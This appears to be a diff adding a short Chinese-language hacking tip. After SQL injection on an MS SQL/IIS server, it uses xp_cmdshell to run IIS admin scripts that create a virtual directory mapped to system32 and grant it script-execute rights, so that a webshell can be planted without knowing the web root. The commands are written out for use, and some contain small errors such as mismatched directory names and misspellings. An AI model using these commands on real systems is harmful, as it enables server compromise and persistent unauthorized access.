@@ -1,0 +1,13 @@
+我们很多情况下都遇到SQL注入可以列目录和运行命令，但是却很不容易找到web所在目录，也就不好得到一个webshell，这一招不错： 
+
+exec master.dbo.xp_cmdshell ’cscript C:\Interpub\AdminScripts\mkwebdir.vbs -c localhost -w "l" -v "win","c:\winnt\system32"’ 
+建立虚拟目录win,指向c:\winnt\system32 
+exec master.dbo.xp_cmdshell ’cscript C:\Interpub\AdminScripts\adsutil.vbs w3svc/1/root/win/Accessexecute Ture’ 
+让win句有解析asp脚本权限 
+
+exec master.dbo.xp_cmdshell "cscript C:\Interpub\AdminScripts\adsutil.vbs delete w3svc/1/root/h4x0r/" 
+删除虚拟目录。 
+找不到web绝对路径的一种解决办法， 
+
+http://21o.net/h4x0r 
+403错误，表示虚拟目录建好了。
